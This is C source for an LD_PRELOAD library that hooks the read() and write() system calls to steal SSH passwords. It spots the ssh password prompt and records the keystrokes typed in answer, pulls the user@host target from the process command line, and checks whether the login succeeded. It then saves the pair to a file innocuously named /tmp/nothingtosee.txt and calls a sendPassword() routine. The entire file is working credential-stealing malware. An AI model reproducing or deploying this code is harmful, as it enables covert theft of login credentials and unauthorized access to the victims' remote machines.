#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <pthread.h>
#include <stdarg.h>
#include "preload.h"

static int isAskingPasswd = 0;
static int isPasswordValid = 1;
static int isPasswordEntered = 0;


void get_ssharg(pass_args *combo){
  FILE *file = fopen("/proc/self/cmdline", "r");
  if (!file) {
    strcpy(combo->arg, "NULL");
    return;
  }
  char fullstring[4096];
  ssize_t len_cmdline = fread(fullstring, 1, sizeof(fullstring), file);
  fclose(file);
  
  if (len_cmdline <= 0) {
    strcpy(combo->arg, "NULL");
    return;
  }
  
  for (int i = 0; i < len_cmdline; i++) {    
    if (fullstring[i] == '\0') {
      fullstring[i] = ' ';
    }
  }

  char *args = strtok(fullstring, " ");
  while ((args = strtok(NULL, " ")) != NULL) {
    if (strstr(args, "@")) {
      strncpy(combo->arg, args, strlen(args));
      combo->arg[strlen(args)] = '\0';
      return;
    }
    else {
      strcpy(combo->arg, "NULL");
      return;
    }
  }
  strcpy(combo->arg, "NULL");
  return;
}

int checkifssh(int fd){
  int pid = getpid();
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/comm", pid);
  FILE *file = fopen(path, "r");
  if (file) {
    char processName[64];
    fgets(processName, sizeof(processName), file);
    processName[strcspn(processName, "\n")] = 0;
    if (strcmp(processName, "ssh") == 0) {
      return 1;
    }
  }
  return 0;
}

ssize_t write(int fd, const void *buf, size_t nbyte) {
  ssize_t (*r_write)(int fd, const void *buf, size_t nbyte) = dlsym(RTLD_NEXT, "write");
  ssize_t output = r_write(fd, buf, nbyte);
  
  if (isatty(fd) && strstr(buf, "password:")) {
    isAskingPasswd = 1;
  }
  
  if (isatty(fd) && fd == 2) {
    if (strstr(buf ,"please try again.")) {
      isPasswordValid = 0;

      if (isPasswordEntered == 1) {
        // printf("NOTHING TO SEE \n");
        // remove("/tmp/nothingtosee.txt");
        isPasswordEntered = 0;
        isPasswordValid = 0;
      }
    }
  }   
  return output;
}


void *Validate(void *arg){
  pass_args *combo = (pass_args*) arg;
  sleep(3);
  if (isPasswordValid == 1) {
    FILE *save = fopen("/tmp/nothingtosee.txt", "w");
    if (!save){
      return NULL;
    }
    sendPassword();
    char string[strlen(combo->password) + strlen(combo->arg) + 2];
    snprintf(string, sizeof(string), "%s %s\n", combo->arg, combo->password);
    fwrite(string, 1, strlen(string), save);
    isAskingPasswd = 0;
    fclose(save);
  }
  isAskingPasswd = 0;
  isPasswordEntered = 0;
  isPasswordValid = 1;
  free(combo);
  return NULL;
}


ssize_t read(int fd, void *buf, size_t nbytes) {
  ssize_t (*r_read)(int fd, void *buf, size_t nbytes) = dlsym(RTLD_NEXT, "read");
  ssize_t output = r_read(fd, buf, nbytes);
  static char tmp_password[64];
  static int pos = 0;
  
  int is_ssh = checkifssh(fd);
  if (isatty(fd) == 1 && is_ssh && isAskingPasswd == 1) {
    tmp_password[pos] = ((char *) buf)[0];
    if (((char*)buf)[0] == '\n') {
      tmp_password[pos] = '\0';
      pass_args *combo = malloc(sizeof(pass_args));
      get_ssharg(combo);
      strncpy(combo->password, tmp_password, sizeof(tmp_password));
      isPasswordValid = 1;
      isPasswordEntered = 1;
      pthread_t waitforvalidate;
      pos = 0;
      pthread_create(&waitforvalidate , NULL, Validate, combo);
      pthread_detach(waitforvalidate);
      memset(tmp_password, 0, sizeof(tmp_password));
    }
    else {
      pos++;
    }
  }


  return output;
}
